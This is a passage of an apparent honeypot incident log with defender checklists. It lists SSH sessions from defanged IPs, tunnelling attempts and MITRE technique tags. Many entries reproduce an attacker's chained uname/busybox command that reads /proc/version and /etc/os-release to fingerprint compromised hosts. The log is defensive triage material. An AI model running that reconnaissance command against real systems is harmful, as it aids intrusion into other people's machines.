| Field | Detail |
|---|---|
| **Source IP** | `38.199.201[.]3` |
| **First Seen** | 2026-08-23 18:13 |
| **Last Seen** | 2026-08-23 18:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:13:08` | `cowrie.session.connect` |
| `2026-08-23 18:13:08` | `cowrie.client.version` |
| `2026-08-23 18:13:08` | `cowrie.client.kex` |
| `2026-08-23 18:13:10` | `cowrie.login.success` |
| `2026-08-23 18:13:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.199.201[.]3` to AbuseIPDB if not already reported
- [ ] Block `38.199.201[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a4939987f65

| Field | Detail |
|---|---|
| **Source IP** | `201.28.234[.]10` |
| **First Seen** | 2026-08-23 18:13 |
| **Last Seen** | 2026-08-23 18:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:13:16` | `cowrie.session.connect` |
| `2026-08-23 18:13:17` | `cowrie.client.version` |
| `2026-08-23 18:13:17` | `cowrie.client.kex` |
| `2026-08-23 18:13:21` | `cowrie.login.success` |
| `2026-08-23 18:13:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.234[.]10` to AbuseIPDB if not already reported
- [ ] Block `201.28.234[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b5ef2a11609

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:14 |
| **Last Seen** | 2026-08-23 18:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:14:01` | `cowrie.session.connect` |
| `2026-08-23 18:14:01` | `cowrie.client.version` |
| `2026-08-23 18:14:01` | `cowrie.client.kex` |
| `2026-08-23 18:14:03` | `cowrie.login.success` |
| `2026-08-23 18:14:05` | `cowrie.session.params` |
| `2026-08-23 18:14:05` | `cowrie.command.input` |
| `2026-08-23 18:14:05` | `cowrie.command.input` |
| `2026-08-23 18:14:05` | `cowrie.command.input` |
| `2026-08-23 18:14:05` | `cowrie.command.input` |
| `2026-08-23 18:14:05` | `cowrie.command.input` |
| `2026-08-23 18:14:05` | `cowrie.command.success` |
| `2026-08-23 18:14:05` | `cowrie.command.input` |
| `2026-08-23 18:14:05` | `cowrie.command.input` |
| `2026-08-23 18:14:05` | `cowrie.command.input` |
| `2026-08-23 18:14:05` | `cowrie.command.input` |
| `2026-08-23 18:14:06` | `cowrie.log.closed` |
| `2026-08-23 18:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb83997c5d2

| Field | Detail |
|---|---|
| **Source IP** | `190.75.248[.]87` |
| **First Seen** | 2026-08-23 18:15 |
| **Last Seen** | 2026-08-23 18:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:15:07` | `cowrie.session.connect` |
| `2026-08-23 18:15:08` | `cowrie.client.version` |
| `2026-08-23 18:15:08` | `cowrie.client.kex` |
| `2026-08-23 18:15:09` | `cowrie.login.success` |
| `2026-08-23 18:15:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.75.248[.]87` to AbuseIPDB if not already reported
- [ ] Block `190.75.248[.]87` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ff1e23284c7

| Field | Detail |
|---|---|
| **Source IP** | `114.30.223[.]119` |
| **First Seen** | 2026-08-23 18:15 |
| **Last Seen** | 2026-08-23 18:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:15:20` | `cowrie.session.connect` |
| `2026-08-23 18:15:21` | `cowrie.client.version` |
| `2026-08-23 18:15:21` | `cowrie.client.kex` |
| `2026-08-23 18:15:23` | `cowrie.login.success` |
| `2026-08-23 18:15:24` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.223[.]119` to AbuseIPDB if not already reported
- [ ] Block `114.30.223[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17a7699d24c4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:16 |
| **Last Seen** | 2026-08-23 18:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:16:03` | `cowrie.session.connect` |
| `2026-08-23 18:16:03` | `cowrie.client.version` |
| `2026-08-23 18:16:03` | `cowrie.client.kex` |
| `2026-08-23 18:16:04` | `cowrie.login.success` |
| `2026-08-23 18:16:05` | `cowrie.session.params` |
| `2026-08-23 18:16:05` | `cowrie.command.input` |
| `2026-08-23 18:16:05` | `cowrie.command.input` |
| `2026-08-23 18:16:05` | `cowrie.command.input` |
| `2026-08-23 18:16:05` | `cowrie.command.input` |
| `2026-08-23 18:16:05` | `cowrie.command.input` |
| `2026-08-23 18:16:05` | `cowrie.command.success` |
| `2026-08-23 18:16:05` | `cowrie.command.input` |
| `2026-08-23 18:16:05` | `cowrie.command.input` |
| `2026-08-23 18:16:05` | `cowrie.command.input` |
| `2026-08-23 18:16:05` | `cowrie.command.input` |
| `2026-08-23 18:16:06` | `cowrie.log.closed` |
| `2026-08-23 18:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d349a722a69

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:18 |
| **Last Seen** | 2026-08-23 18:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:18:01` | `cowrie.session.connect` |
| `2026-08-23 18:18:01` | `cowrie.client.version` |
| `2026-08-23 18:18:01` | `cowrie.client.kex` |
| `2026-08-23 18:18:03` | `cowrie.login.success` |
| `2026-08-23 18:18:05` | `cowrie.session.params` |
| `2026-08-23 18:18:05` | `cowrie.command.input` |
| `2026-08-23 18:18:05` | `cowrie.command.input` |
| `2026-08-23 18:18:05` | `cowrie.command.input` |
| `2026-08-23 18:18:05` | `cowrie.command.input` |
| `2026-08-23 18:18:05` | `cowrie.command.input` |
| `2026-08-23 18:18:05` | `cowrie.command.success` |
| `2026-08-23 18:18:05` | `cowrie.command.input` |
| `2026-08-23 18:18:05` | `cowrie.command.input` |
| `2026-08-23 18:18:05` | `cowrie.command.input` |
| `2026-08-23 18:18:05` | `cowrie.command.input` |
| `2026-08-23 18:18:05` | `cowrie.log.closed` |
| `2026-08-23 18:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-601ba0f6f2f4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:19 |
| **Last Seen** | 2026-08-23 18:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:19:59` | `cowrie.session.connect` |
| `2026-08-23 18:19:59` | `cowrie.client.version` |
| `2026-08-23 18:19:59` | `cowrie.client.kex` |
| `2026-08-23 18:20:01` | `cowrie.login.success` |
| `2026-08-23 18:20:03` | `cowrie.session.params` |
| `2026-08-23 18:20:03` | `cowrie.command.input` |
| `2026-08-23 18:20:03` | `cowrie.command.input` |
| `2026-08-23 18:20:03` | `cowrie.command.input` |
| `2026-08-23 18:20:03` | `cowrie.command.input` |
| `2026-08-23 18:20:03` | `cowrie.command.input` |
| `2026-08-23 18:20:03` | `cowrie.command.success` |
| `2026-08-23 18:20:03` | `cowrie.command.input` |
| `2026-08-23 18:20:03` | `cowrie.command.input` |
| `2026-08-23 18:20:03` | `cowrie.command.input` |
| `2026-08-23 18:20:03` | `cowrie.command.input` |
| `2026-08-23 18:20:04` | `cowrie.log.closed` |
| `2026-08-23 18:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493c4bce02ce

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:21 |
| **Last Seen** | 2026-08-23 18:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:21:55` | `cowrie.session.connect` |
| `2026-08-23 18:21:55` | `cowrie.client.version` |
| `2026-08-23 18:21:55` | `cowrie.client.kex` |
| `2026-08-23 18:21:56` | `cowrie.login.success` |
| `2026-08-23 18:21:58` | `cowrie.session.params` |
| `2026-08-23 18:21:58` | `cowrie.command.input` |
| `2026-08-23 18:21:58` | `cowrie.command.input` |
| `2026-08-23 18:21:58` | `cowrie.command.input` |
| `2026-08-23 18:21:58` | `cowrie.command.input` |
| `2026-08-23 18:21:58` | `cowrie.command.input` |
| `2026-08-23 18:21:58` | `cowrie.command.success` |
| `2026-08-23 18:21:58` | `cowrie.command.input` |
| `2026-08-23 18:21:58` | `cowrie.command.input` |
| `2026-08-23 18:21:58` | `cowrie.command.input` |
| `2026-08-23 18:21:58` | `cowrie.command.input` |
| `2026-08-23 18:21:58` | `cowrie.log.closed` |
| `2026-08-23 18:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-591aa88703a5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:22 |
| **Last Seen** | 2026-08-23 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:22:14` | `cowrie.session.connect` |
| `2026-08-23 18:22:14` | `cowrie.client.version` |
| `2026-08-23 18:22:14` | `cowrie.client.kex` |
| `2026-08-23 18:22:15` | `cowrie.login.success` |
| `2026-08-23 18:22:16` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:22:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:22:16` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc25aba777ef

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:22 |
| **Last Seen** | 2026-08-23 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:22:18` | `cowrie.session.connect` |
| `2026-08-23 18:22:18` | `cowrie.client.version` |
| `2026-08-23 18:22:19` | `cowrie.client.kex` |
| `2026-08-23 18:22:19` | `cowrie.login.success` |
| `2026-08-23 18:22:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:22:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:22:20` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0ab9bfc2bf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:23 |
| **Last Seen** | 2026-08-23 18:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:23:44` | `cowrie.session.connect` |
| `2026-08-23 18:23:44` | `cowrie.client.version` |
| `2026-08-23 18:23:45` | `cowrie.client.kex` |
| `2026-08-23 18:23:46` | `cowrie.login.success` |
| `2026-08-23 18:23:47` | `cowrie.session.params` |
| `2026-08-23 18:23:47` | `cowrie.command.input` |
| `2026-08-23 18:23:47` | `cowrie.command.input` |
| `2026-08-23 18:23:47` | `cowrie.command.input` |
| `2026-08-23 18:23:47` | `cowrie.command.input` |
| `2026-08-23 18:23:47` | `cowrie.command.input` |
| `2026-08-23 18:23:47` | `cowrie.command.success` |
| `2026-08-23 18:23:47` | `cowrie.command.input` |
| `2026-08-23 18:23:47` | `cowrie.command.input` |
| `2026-08-23 18:23:47` | `cowrie.command.input` |
| `2026-08-23 18:23:47` | `cowrie.command.input` |
| `2026-08-23 18:23:48` | `cowrie.log.closed` |
| `2026-08-23 18:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-307ff74e7bf7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:27 |
| **Last Seen** | 2026-08-23 18:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:27:27` | `cowrie.session.connect` |
| `2026-08-23 18:27:27` | `cowrie.client.version` |
| `2026-08-23 18:27:27` | `cowrie.client.kex` |
| `2026-08-23 18:27:28` | `cowrie.login.success` |
| `2026-08-23 18:27:30` | `cowrie.session.params` |
| `2026-08-23 18:27:30` | `cowrie.command.input` |
| `2026-08-23 18:27:30` | `cowrie.command.input` |
| `2026-08-23 18:27:30` | `cowrie.command.input` |
| `2026-08-23 18:27:30` | `cowrie.command.input` |
| `2026-08-23 18:27:30` | `cowrie.command.input` |
| `2026-08-23 18:27:30` | `cowrie.command.success` |
| `2026-08-23 18:27:30` | `cowrie.command.input` |
| `2026-08-23 18:27:30` | `cowrie.command.input` |
| `2026-08-23 18:27:30` | `cowrie.command.input` |
| `2026-08-23 18:27:30` | `cowrie.command.input` |
| `2026-08-23 18:27:30` | `cowrie.log.closed` |
| `2026-08-23 18:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de0a5d9be0c7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:29 |
| **Last Seen** | 2026-08-23 18:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:29:20` | `cowrie.session.connect` |
| `2026-08-23 18:29:21` | `cowrie.client.version` |
| `2026-08-23 18:29:21` | `cowrie.client.kex` |
| `2026-08-23 18:29:22` | `cowrie.login.success` |
| `2026-08-23 18:29:23` | `cowrie.session.params` |
| `2026-08-23 18:29:23` | `cowrie.command.input` |
| `2026-08-23 18:29:23` | `cowrie.command.input` |
| `2026-08-23 18:29:23` | `cowrie.command.input` |
| `2026-08-23 18:29:23` | `cowrie.command.input` |
| `2026-08-23 18:29:23` | `cowrie.command.input` |
| `2026-08-23 18:29:23` | `cowrie.command.success` |
| `2026-08-23 18:29:23` | `cowrie.command.input` |
| `2026-08-23 18:29:23` | `cowrie.command.input` |
| `2026-08-23 18:29:23` | `cowrie.command.input` |
| `2026-08-23 18:29:23` | `cowrie.command.input` |
| `2026-08-23 18:29:23` | `cowrie.log.closed` |
| `2026-08-23 18:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2efd81a7ad6

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]23` |
| **First Seen** | 2026-08-23 18:30 |
| **Last Seen** | 2026-08-23 18:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:30:39` | `cowrie.session.connect` |
| `2026-08-23 18:30:40` | `cowrie.client.version` |
| `2026-08-23 18:30:40` | `cowrie.client.kex` |
| `2026-08-23 18:30:43` | `cowrie.login.success` |
| `2026-08-23 18:30:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]23` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f33de0df9030

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:31 |
| **Last Seen** | 2026-08-23 18:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:31:16` | `cowrie.session.connect` |
| `2026-08-23 18:31:17` | `cowrie.client.version` |
| `2026-08-23 18:31:17` | `cowrie.client.kex` |
| `2026-08-23 18:31:18` | `cowrie.login.success` |
| `2026-08-23 18:31:20` | `cowrie.session.params` |
| `2026-08-23 18:31:20` | `cowrie.command.input` |
| `2026-08-23 18:31:20` | `cowrie.command.input` |
